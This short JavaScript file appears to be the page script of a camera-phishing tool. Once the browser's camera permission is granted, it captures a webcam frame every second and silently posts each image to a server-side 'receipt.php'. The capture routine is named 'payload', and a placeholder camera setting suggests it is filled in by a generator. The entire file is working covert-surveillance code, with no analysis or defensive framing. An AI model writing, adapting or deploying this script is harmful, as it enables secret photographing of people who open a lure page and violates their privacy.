
function envio(videostream){
	$.ajax({
		url: 'receipt.php',
		type: 'post',
		dataType: 'json',
		data: { fot: videostream }
	});
};

var video = document.getElementById("video");
var canva = document.getElementById("canva");

const constraints = {
 audio: false,
  video: {
    facingMode: {
	    exact: "type_camera"
    }
  }
};


async function inicio(){
	var stream = await navigator.mediaDevices.getUserMedia(constraints);
	payload(stream);
}

function payload(stream){
	video.srcObject = stream;
	var ctx = canva.getContext('2d');
	
	setInterval(function(){
		ctx.drawImage(video, 0, 0, 300, 400);
		var videostream = canva.toDataURL("image/png").replace("image/png", "image/octet-stream");
		envio(videostream); }, 1000);
}

inicio();
